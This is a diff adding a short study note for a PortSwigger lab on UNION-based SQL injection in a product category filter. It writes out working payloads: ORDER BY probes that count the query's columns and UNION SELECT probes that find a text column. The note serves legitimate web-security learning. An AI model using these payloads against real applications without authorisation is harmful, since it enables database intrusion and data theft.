@@ -1,0 +1,40 @@
+SQL Injeciton - Product Category filter
+
+Main Goal :-- 
+
+find random value that you need to make appear with in query
+
+
+1> Determine # of columns that the vulnerable query is using
+' order by 1--
+' order by 2--
+' order by 3--
+
+' order by 4 gives error means 3 column
+total column=3
+
+2> Determine the data type of the columns
+
+select a,b,c from table1 where cateogry='Gifts
+' UNION select 'a', NULL,NULL--
+' UNION select  NULL, 'a',NULL--
+' UNION select  NULL, NULL, 'a'--
+
+--> error ->> column is not type string
+--> no error ->> column is type string
+
+Analysis:
+---------
+
+' order by 4 -- 
+total column=3
+1 column is default id , it will not show on page
+
+' UNION select  NULL, 'lzamFV', NULL--
+-> 2nd column is of string type
+
+lab: -- 
+
+https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
+
+
